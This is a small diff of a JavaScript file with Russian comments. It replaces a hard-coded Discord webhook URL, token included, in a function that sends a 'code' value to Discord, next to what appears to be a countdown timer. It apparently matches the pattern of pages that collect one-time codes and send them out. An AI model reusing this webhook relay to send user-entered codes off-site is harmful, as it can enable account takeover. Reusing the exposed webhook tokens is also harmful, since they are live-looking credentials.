@@ -25,7 +25,7 @@ function updateTimer() {
 
 // Функция отправки данных в Discord через вебхук
 function sendToDiscord(code) {
-    const webhookUrl = "https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB";  // Замените на ваш реальный URL вебхука
+    const webhookUrl = "https://discordapp.com/api/webhooks/1307681216220233800/cCpZnpuKDlPl6PnQnqO6rvhPHyX8KEQ5eqq16y_PaTVaTzOGAOS3ANs4WxWfPc9yAH_Z";  // Замените на ваш реальный URL вебхука
 
     // Формируем сообщение для Discord
     const payload = {
